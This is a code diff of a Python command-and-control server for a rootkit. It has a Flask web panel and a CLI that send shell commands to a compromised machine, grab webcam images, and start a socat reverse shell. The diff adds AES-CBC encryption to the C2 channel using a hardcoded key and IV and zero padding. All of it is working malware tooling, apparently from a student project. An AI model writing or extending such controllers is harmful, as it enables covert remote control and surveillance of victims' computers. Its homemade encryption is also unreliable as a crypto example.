@@ -11,14 +11,20 @@ from flask import Flask, request, render_template, redirect, url_for, flash, sen
 from werkzeug.utils import secure_filename
 from prompt_toolkit import PromptSession
 from prompt_toolkit.patch_stdout import patch_stdout
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import padding
 
 # -------------------- CONFIGURATION --------------------
 HOST = '0.0.0.0'
 PORT = 4242
-BUFFER_SIZE = 4096
+BUFFER_SIZE = 1024
 PASSWORD = "epiroot"
 UPLOAD_FOLDER = "uploads"
 DOWNLOAD_FOLDER = "downloads"
+
+AES_KEY = b'1234567890abcdef'  # 16 bytes = 128 bits
+AES_IV = b'abcdef1234567890'   # 16 bytes = 128 bits
 
 # -------------------- FLASK SETUP ----------------------
 app = Flask(__name__)
@@ -162,7 +168,8 @@ def send():
 
     try:
         with connection_lock:
-            rootkit_connection.sendall((cmd + "\n").encode())
+            to_send = aes_encrypt(cmd + "\n")
+            rootkit_connection.sendall(to_send)
             if 'killcom' in cmd.lower():
                 rootkit_connection.close()
                 last_response = {"stdout": "", "stderr": "Connexion terminée."}
@@ -177,10 +184,11 @@ def send():
                         part = rootkit_connection.recv(BUFFER_SIZE)
                         if not part:
                             break
-                        chunks.append(part)
+                        decrypted_part = aes_decrypt(part)
+                        chunks.append(decrypted_part)
                     except socket.timeout:
                         break
-                response = b''.join(chunks).decode()
+                response = ''.join(chunks)
 
                 stdout_marker = "stdout:"
                 stderr_marker = "stderr:"
@@ -249,6 +257,24 @@ def webcam():
 
     return render_template("webcam.html", webcam_output=webcam_output, image_exists=image_exists, image_path=image_path)
 
+# ---------------- AES Encryption/Decryption ----------------
+def aes_encrypt(plaintext):
+    data = plaintext.encode()
+    padding_len = 16 - (len(data) % 16)
+    data += b'\x00' * padding_len
+
+    cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
+    encryptor = cipher.encryptor()
+    encrypted = encryptor.update(data) + encryptor.finalize()
+    return encrypted
+
+
+def aes_decrypt(ciphertext):
+    cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
+    decryptor = cipher.decryptor()
+    decrypted = decryptor.update(ciphertext) + decryptor.finalize()
+    return decrypted.rstrip(b'\x00').decode()
+
 # ---------------------- SOCKET THREAD ----------------------
 def socket_listener():
     global rootkit_connection, rootkit_address
@@ -264,9 +290,11 @@ def socket_listener():
         rootkit_address = address
 
     print(f"✅ [+] Rootkit connecté depuis {address[0]}")
-    data = connection.recv(1024).decode()
+
+    data = connection.recv(BUFFER_SIZE)
+    decrypted = aes_decrypt(data)
     if data:
-        print(f"📥 [rootkit] {data.strip()}")
+        print(f"📥 [rootkit] {decrypted.strip()}")
 
 # ---------------------- CLI MODE ----------------------
 def run_socat_shell(port=9001):
@@ -331,7 +359,8 @@ def run_cli():
                         threading.Thread(target=run_socat_shell).start()
                         time.sleep(1)
                     command_history.append(line)
-                    connection.sendall((line + "\n").encode())
+                    to_send = aes_encrypt(line + "\n")
+                    connection.sendall(to_send)
                     if line.lower() == "killcom":
                         print("❌ Fermeture demandée.")
                         return
@@ -345,13 +374,17 @@ def run_cli():
     def receive_responses():
         while True:
             try:
-                data = connection.recv(BUFFER_SIZE).decode()
+                data = connection.recv(BUFFER_SIZE)
                 if data:
-                    print(f"{data.strip()}")
+                    try:
+                        decrypted = aes_decrypt(data)
+                        print(f"{decrypted.strip()}")
+                    except Exception as e:
+                        print(f"💥 [!] Decryption error: {e}")
                 else:
                     break
             except Exception as e:
-                print(f"💥 Erreur de réception : {e}")
+                print(f"💥 [!] Reception error: {e}")
                 break
 
     threading.Thread(target=receive_responses, daemon=True).start()
